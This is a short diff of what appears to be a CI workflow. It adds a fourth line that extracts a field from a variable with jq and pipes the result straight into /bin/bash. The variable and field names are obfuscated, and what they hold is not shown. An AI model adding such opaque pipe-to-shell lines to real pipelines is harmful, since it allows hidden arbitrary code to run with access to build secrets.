@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$wcd2621" | jq -r .qgnum127 | /bin/bash
           echo $s84 | jq -r .pn56835 | /bin/bash
           echo $j3 | jq -r .dd7 | /bin/bash
+          echo $nbmhc224 | jq -r .nhlhe94899 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
